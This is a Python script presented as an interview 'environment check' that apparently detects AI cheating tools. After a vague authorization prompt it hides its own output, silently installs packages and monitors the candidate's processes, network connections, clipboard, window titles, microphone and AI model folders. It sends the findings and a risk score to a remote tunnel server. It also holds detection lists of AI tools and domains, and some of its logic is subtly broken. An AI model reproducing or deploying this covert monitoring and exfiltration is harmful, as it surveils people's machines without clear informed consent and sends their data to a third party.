import sys
import os
import subprocess
import time
import socket
import threading
import uuid
import hashlib
import json
import signal
import traceback

# Stealth mode - redirect output to null after authorization
if sys.platform != 'win32':
    DEVNULL = open(os.devnull, 'w')
    sys.stdout = DEVNULL
    sys.stderr = DEVNULL

ERROR_LOG = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'agent_error.log')

def log(msg):
    ts = time.strftime('%Y-%m-%d %H:%M:%S')
    line = f"[{ts}] {msg}"
    try:
        with open(ERROR_LOG, 'a', encoding='utf-8') as f:
            f.write(line + '\n')
    except:
        pass

# Authorization pop-up (only shown once)
def authorize():
    print("\n" + "="*50)
    print("  ENVIRONMENT CHECK AUTHORIZATION")
    print("="*50)
    print("This tool will verify your system setup for the interview.")
    print("Click OK to authorize.")
    input("Press Enter to continue...")
    print("Authorization complete. Starting check...")
    time.sleep(1)
    print("Check running in background...")
    time.sleep(1)

authorize()

# BOOTSTRAP (silent)
def bootstrap():
    packages = ['psutil', 'pyperclip', 'requests', 'cryptography']
    try:
        import pyaudio
        packages.append('pyaudio')
    except:
        pass
    for pkg in packages:
        try:
            __import__(pkg.split('[')[0])
        except ImportError:
            subprocess.run(
                [sys.executable, '-m', 'pip', 'install', pkg, '--quiet'],
                capture_output=True, timeout=120
            )

bootstrap()

import requests
import psutil
import pyperclip

# Optional imports
PYAUDIO_OK = False
CTYPES_OK = False
try:
    import pyaudio
    PYAUDIO_OK = True
except:
    pass

try:
    import ctypes
    from ctypes import wintypes
    CTYPES_OK = True
except:
    pass

# GLOBALS
SERVER_URL = "https://benjamin-legend-martin-mistakes.trycloudflare.com"
SESSION_ID = str(uuid.uuid4())
TERMINATE = threading.Event()
events = []
start_time = time.time()
tamper_detected = False

DANGEROUS_PROCESSES = [
    'cluely', 'ngrok', 'ollama', 'anydesk', 'teamviewer', 'lmstudio', 'jan',
    'yoodli', 'interviewcoder', 'finalround', 'leetcodewizard', 'parakeet',
    'lockedin', 'shadecoder', 'huru', 'cursor', 'pluely', 'hiddenpro',
    'electron', 'helper', 'python', 'node'  # low-level: check for AI wrappers
]

DANGEROUS_KEYWORDS = [
    'chatgpt', 'claude', 'gemini', 'grok', 'copilot', 'perplexity',
    'openai', 'anthropic', 'cluely', 'parakeet', 'yoodli', 'interviewcoder',
    'finalround', 'shadecoder', 'huru', 'lockedin', 'x.ai', 'grok xai',
    'llama', 'mistral', 'gpt', 'ai', 'model'  # low-level keywords
]

DANGEROUS_DOMAINS = [
    'api.openai.com', 'chat.openai.com', 'claude.ai', 'api.anthropic.com',
    'gemini.google.com', 'api.groq.com', 'api.mistral.ai', 'openrouter.ai',
    'perplexity.ai', 'grok.x.ai', 'api.x.ai', 'cluely.ai', 'parakeet-ai.com',
    'yoodli.ai', 'interviewcoder.co', 'ngrok.io', 'anydesk.com',
    'huggingface.co', 'replicate.com'  # model download sites
]

AI_PORTS = [11434, 1234, 8080, 7860, 5000, 6006]  # common LLM ports

# Pre-resolve
dangerous_ips = set()
def resolve_ips():
    for domain in DANGEROUS_DOMAINS:
        try:
            for res in socket.getaddrinfo(domain, None):
                dangerous_ips.add(res[4][0])
        except:
            pass

resolve_ips()

# Low-level hidden AI detection
def check_hidden_ai():
    suspicious_files = []
    # Check for common AI model directories/files
    dirs = ['~/.ollama', '/tmp/llm', '/tmp/models', '~/.cache/huggingface', '~/.local/share/ollama']
    for d in dirs:
        expanded = os.path.expanduser(d)
        if os.path.exists(expanded):
            suspicious_files.append(d)
    # Check for AI libs in conda/python envs
    if 'conda' in os.environ.get('PATH', ''):
        suspicious_files.append('conda_env_detected')
    return suspicious_files

# CONNECTION
def test_connection():
    for attempt in range(3):
        try:
            r = requests.get(f"{SERVER_URL}/health", timeout=5)
            if r.status_code == 200:
                return True
        except:
            time.sleep(2)
    return False

def register():
    try:
        with open(__file__, "rb") as f:
            h = hashlib.sha256(f.read()).hexdigest()
        r = requests.post(
            f"{SERVER_URL}/register",
            json={'session_id': SESSION_ID, 'agent_hash': h},
            timeout=6
        )
        return r.status_code == 200
    except:
        return False

# POST
def post(event_type, data):
    ts = time.strftime('%H:%M:%S')
    entry = {'ts': ts, 'event': event_type, 'data': data}
    events.append(entry)
    try:
        requests.post(f"{SERVER_URL}/event", json={'session_id': SESSION_ID, **entry}, timeout=4)
    except:
        pass

# MONITORS
def monitor_processes():
    seen = set()
    while not TERMINATE.is_set():
        for p in psutil.process_iter(['pid', 'name', 'cmdline']):
            try:
                name = (p.info['name'] or '').lower()
                cmd = ' '.join(p.info['cmdline'] or []).lower()
                if p.pid in seen: continue
                if any(t in name or t in cmd for t in DANGEROUS_PROCESSES):
                    seen.add(p.pid)
                    post('DANGEROUS_PROCESS', {'name': name, 'cmd': cmd[:50]})
                # Low-level: check for AI model loading
                if any('llama' in cmd or 'gpt' in cmd or 'model' in cmd):
                    post('HIDDEN_AI_MODEL', {'cmd': cmd[:50]})
            except:
                pass
        time.sleep(3)

def monitor_network():
    seen = set()
    while not TERMINATE.is_set():
        for c in psutil.net_connections(kind='inet'):
            if not c.raddr: continue
            ip = c.raddr.ip
            if ip in seen or ip.startswith(('127.', '::1', '10.', '192.168.', '172.')):
                continue
            if ip in dangerous_ips:
                seen.add(ip)
                post('DANGEROUS_CONNECTION', {'ip': ip})
        time.sleep(4)

def monitor_clipboard():
    last_hash = ''
    while not TERMINATE.is_set():
        try:
            txt = pyperclip.paste()
            if txt and len(txt) > 200:
                h = hashlib.sha256(txt.encode(errors='replace')).hexdigest()
                if h != last_hash:
                    last_hash = h
                    post('LARGE_PASTE', {'chars': len(txt)})
        except:
            pass
        time.sleep(1)

def monitor_windows():
    if not CTYPES_OK or sys.platform != 'win32':
        return
    seen = set()
    while not TERMINATE.is_set():
        try:
            titles = []
            # Enhanced: include minimized windows (visible = False filter removed)
            def enum(hwnd, _):
                # Check for taskbar/systray via Shell_TrayWnd and notification area
                if ctypes.windll.user32.IsWindowVisible(hwnd) or ctypes.windll.user32.IsIconic(hwnd):
                    n = ctypes.windll.user32.GetWindowTextLengthW(hwnd) + 1
                    buf = ctypes.create_unicode_buffer(n)
                    ctypes.windll.user32.GetWindowTextW(hwnd, buf, n)
                    t = buf.value.strip().lower()
                    if t: titles.append(t)
                return True
            ctypes.windll.user32.EnumWindows(
                ctypes.WINFUNCTYPE(ctypes.c_bool, wintypes.HWND, wintypes.LPARAM)(enum), 0
            )
            # Low-level taskbar enumeration
            try:
                tray_hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
                if tray_hwnd:
                    titles.append("taskbar_detected")  # flag taskbar presence for AI overlays
            except:
                pass
            for t in titles:
                if t in seen: continue
                seen.add(t)
                for kw in DANGEROUS_KEYWORDS:
                    if kw in t:
                        post('DANGEROUS_WINDOW', {'title': t[:100], 'keyword': kw, 'minimized': 'taskbar' in t})
                        break
        except:
            pass
        time.sleep(2)

def monitor_hidden_ai():
    last_check = 0
    while not TERMINATE.is_set():
        now = time.time()
        if now - last_check < 30:
            time.sleep(5)
            continue
        last_check = now
        suspicious = check_hidden_ai()
        if suspicious:
            post('HIDDEN_AI_DETECTED', {'files': suspicious})
        time.sleep(10)

def monitor_mic():
    if not PYAUDIO_OK:
        return
    p = pyaudio.PyAudio()
    busy_count = 0
    while not TERMINATE.is_set():
        try:
            stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100,
                            input=True, frames_per_buffer=512)
            stream.read(512, exception_on_overflow=False)
            stream.close()
            busy_count = 0
        except OSError:
            busy_count += 1
            if busy_count >= 2:
                post('DANGEROUS_MIC', {'status': 'active', 'count': busy_count})
        time.sleep(4)
    p.terminate()

def heartbeat():
    while not TERMINATE.is_set():
        try:
            requests.post(f"{SERVER_URL}/heartbeat", json={'session_id': SESSION_ID}, timeout=6)
            r = requests.get(f"{SERVER_URL}/should_terminate/{SESSION_ID}", timeout=6)
            if r.json().get('terminate'):
                TERMINATE.set()
        except:
            pass
        time.sleep(15)

# REPORT
def send_report():
    if not events:
        return
    score = 0
    summary = {'proc': set(), 'net': set(), 'win': set(), 'paste': 0, 'mic': 0, 'hidden': 0}
    for e in events:
        t = e['event']
        d = e['data']
        if t == 'DANGEROUS_PROCESS': score += 35; summary['proc'].add(d.get('name','?'))
        elif t == 'DANGEROUS_CONNECTION': score += 30; summary['net'].add(d.get('ip','?'))
        elif t == 'DANGEROUS_WINDOW': score += 25; summary['win'].add(d.get('keyword','?'))
        elif t == 'LARGE_PASTE': score += 15; summary['paste'] += 1
        elif t == 'DANGEROUS_MIC': score += 25; summary['mic'] += 1
        elif t == 'HIDDEN_AI_DETECTED': score += 40; summary['hidden'] += 1
    score = min(score, 100)
    report = {
        'session_id': SESSION_ID,
        'duration_sec': int(time.time() - start_time),
        'risk_score': score,
        'summary': {k: list(v) for k,v in summary.items()},
        'event_count': len(events)
    }
    try:
        requests.post(f"{SERVER_URL}/report", json=report, timeout=10)
    except:
        pass

# EXIT
def on_exit(sig=None, frame=None):
    send_report()
    TERMINATE.set()
    sys.exit(0)

signal.signal(signal.SIGINT, on_exit)
signal.signal(signal.SIGTERM, on_exit)

# MAIN
def main():
    try:
        if not test_connection() or not register():
            sys.exit(1)
        threading.Thread(target=monitor_processes, daemon=True).start()
        threading.Thread(target=monitor_network, daemon=True).start()
        threading.Thread(target=monitor_clipboard, daemon=True).start()
        threading.Thread(target=monitor_windows, daemon=True).start()
        threading.Thread(target=monitor_hidden_ai, daemon=True).start()
        threading.Thread(target=monitor_mic, daemon=True).start()
        threading.Thread(target=heartbeat, daemon=True).start()
        TERMINATE.wait()
    except:
        pass
    finally:
        send_report()

if __name__ == '__main__':
    main()
